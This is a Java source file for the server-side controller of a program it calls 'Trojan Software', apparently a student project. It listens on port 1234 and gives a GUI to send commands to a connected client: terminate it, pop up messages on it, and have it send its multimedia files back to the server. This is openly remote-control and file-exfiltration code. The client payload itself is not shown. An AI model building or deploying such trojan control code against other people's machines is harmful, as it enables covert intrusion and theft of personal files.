// Zachary Tennant

import java.net.*;
import java.io.*;
import javax.swing.*;
import java.awt.event.*;
import java.awt.*;

class TrojanServerMain
{
	public static void main(String[] x)
	{
		ServerSocket serverSocket;
		Socket normalSocket;
		Talker t;

		try
		{
			serverSocket = new ServerSocket(1234);
			normalSocket = serverSocket.accept();

			t = new Talker(normalSocket);
			new ControlFrame(t);

			while(true)
				t.receive();
		}
		catch(IOException ioe)
		{
			JOptionPane.showMessageDialog(null, "Server can't connect");
		}
	} // end main
} // end TrojanServerMain class

//###############################################

class ControlFrame extends JFrame
						implements ActionListener
{
// button panel
	JPanel buttonPanel;

// server commands
	JRadioButton terminateButton;
	JRadioButton msgButton;
	JRadioButton retFilesButton;

// go button
	JButton goButton;

// container
	Container cp;

// talker
	Talker t;

//===============================================

// constructor
	ControlFrame(Talker t)
	{
		this.t = t;
// button panel
		buttonPanel = new JPanel(new GridLayout(3,1));

// terminate button
		terminateButton = new JRadioButton("Terminate");
		terminateButton.setActionCommand("TERMINATE");
		terminateButton.setToolTipText("Terminates the client program");
		terminateButton.addActionListener(this);
		buttonPanel.add(terminateButton);

// message button
		msgButton = new JRadioButton("Send Message");
		msgButton.setActionCommand("SEND_MESSAGE");
		msgButton.setToolTipText("Has a specified message popup on client");
		msgButton.addActionListener(this);
		buttonPanel.add(msgButton);

// return files button
		retFilesButton = new JRadioButton("Retrieve Media Files");
		retFilesButton.setActionCommand("SEND_FILE_NAMES");
		retFilesButton.setToolTipText("Send clients multimedia files to server");
		retFilesButton.addActionListener(this);
		buttonPanel.add(retFilesButton);

// go button
		goButton = new JButton("Go");
		goButton.setActionCommand("GO");
		goButton.setToolTipText("Sends the specified commands to the client");
		goButton.addActionListener(this);
		getRootPane().setDefaultButton(goButton);

// content pane
		cp = getContentPane();
		cp.add(buttonPanel, BorderLayout.CENTER);
		cp.add(goButton, BorderLayout.SOUTH);

// main frame
		setupMainFrame();
	} // end constructor

//###############################################

	void setupMainFrame()
	{
		Toolkit tk;
		Dimension d;

		tk = Toolkit.getDefaultToolkit();
		d = tk.getScreenSize();
		setSize(d.width/4, d.height/4);
		setLocation(d.width/4, d.height/4);

		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

		setTitle("Trojan Software");

		setVisible(true);
	} // end of setupMainFrame()

//###############################################

	public void actionPerformed(ActionEvent e)
	{
		String cmd = e.getActionCommand();

		if(cmd.equals("GO"))
			doGo();
		else if(cmd.equals("TERMINATE"))
		{
			msgButton.setSelected(false);
			retFilesButton.setSelected(false);
		}
		else if(cmd.equals("SEND_MESSAGE"))
		{
			terminateButton.setSelected(false);
			retFilesButton.setSelected(false);
		}
		else
		{
			terminateButton.setSelected(false);
			msgButton.setSelected(false);
		}
	} // end actionPerformed

//===============================================

	void doGo()
	{
		try
		{
			if(terminateButton.isSelected())
			{
				t.send("TERMINATE");
				System.exit(1);
			}
			if(msgButton.isSelected())
			{
				t.send("SEND_MESSAGE");
				msgButton.setSelected(false);
			}
			if(retFilesButton.isSelected())
			{
				t.send("SEND_FILE_NAMES");
				retFilesButton.setSelected(false);
			}
		} // end try
		catch(IOException ioe)
		{
			JOptionPane.showMessageDialog(null, "Unable to send command to client");
		}
	} // end doGo
} // end controlFrame class